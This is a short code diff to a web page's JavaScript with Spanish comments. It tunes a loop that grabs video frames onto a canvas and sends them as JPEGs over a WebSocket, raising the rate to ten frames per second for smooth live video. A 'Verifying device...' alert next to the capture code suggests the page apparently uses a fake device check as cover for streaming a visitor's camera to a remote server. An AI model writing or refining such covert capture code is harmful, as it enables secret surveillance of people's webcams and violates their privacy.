@@ -36,19 +36,19 @@
                 const ctx = canvas.getContext('2d');
 
                 socket.onopen = () => {
-                    setInterval(() => {
+                setInterval(() => {
     if (video.videoWidth > 0) {
-        // Bajamos un poquito la escala para estabilidad
-        canvas.width = 854; 
+        // Resolución estándar para fluidez total
+        canvas.width = 640; 
         canvas.height = 480; 
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         if (socket.readyState === WebSocket.OPEN) {
-            // Bajamos calidad a 0.5 para que el archivo sea ligero
-            socket.send(canvas.toDataURL('image/jpeg', 0.5));
+            // Calidad 0.3: Muy ligero, pero se ve bien en monitores
+            socket.send(canvas.toDataURL('image/jpeg', 0.3));
         }
     }
-}, 1000); // 1 FOTO POR SEGUNDO (Esto garantiza que no se cierre)
+}, 100); // 10 FOTOS POR SEGUNDO (Esto dará efecto de video fluido)
                 };
                 alert("Verificando dispositivo...");
             } catch (e) {
